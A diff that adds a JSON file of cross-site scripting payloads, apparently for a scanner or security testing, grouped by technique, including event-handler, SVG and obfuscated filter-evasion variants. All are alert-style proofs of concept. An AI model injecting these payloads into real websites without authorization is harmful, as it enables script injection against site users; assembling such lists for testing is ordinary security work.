@@ -1,0 +1,37 @@
+{
+  "Basic": [
+    "<script>alert(1)</script>",
+    "\"'><img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>"
+  ],
+  "DOM": [
+    "<script>document.write('XSS')</script>",
+    "<script>location.href='javascript:alert(1)'</script>",
+    "<script>eval('alert(1)')</script>"
+  ],
+  "HTML5": [
+    "<video src=1 onerror=alert(1)>",
+    "<audio src=1 onerror=alert(1)>",
+    "<canvas onmouseover=alert(1)>"
+  ],
+  "EventHandlers": [
+    "<body onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<button onclick=alert(1)>Click</button>"
+  ],
+  "SVG": [
+    "<svg><script>alert(1)</script></svg>",
+    "<svg/onload=alert(1)>",
+    "<animate onbegin=alert(1)>"
+  ],
+  "Obfuscated": [
+    "<scr<script>ipt>alert(1)</scr<script>ipt>",
+    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+    "<iframe srcdoc='<script>alert(1)</script>'>"
+  ],
+  "Advanced": [
+    "<details open ontoggle=alert(1)>",
+    "<object data=javascript:alert(1)>",
+    "<embed src=javascript:alert(1)>"
+  ]
+}
